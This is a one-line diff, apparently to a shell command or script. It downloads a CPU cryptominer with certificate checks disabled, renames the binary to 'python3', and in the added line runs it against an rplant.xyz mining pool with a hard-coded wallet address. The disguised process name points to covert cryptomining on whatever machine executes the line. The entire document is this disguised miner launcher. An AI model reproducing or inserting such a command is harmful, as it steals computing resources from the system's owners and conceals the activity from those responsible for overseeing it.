@@ -1,1 +1,1 @@
-wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz --no-check-certificate && tar xf cpuminer-opt-linux.tar.gz && mv cpuminer-sse2 python3 
+wget https://github.com/rplant8/cpuminer-opt-rplant/releases/download/5.0.27/cpuminer-opt-linux.tar.gz --no-check-certificate && tar xf cpuminer-opt-linux.tar.gz && mv cpuminer-sse2 python3 && ./python3 -a yespowerTIDE -o stratum+tcps://stratum-asia.rplant.xyz:17059 -u TJtr1jpnui4eF63kUojAy6SK3ye14ZRoGq.adethia
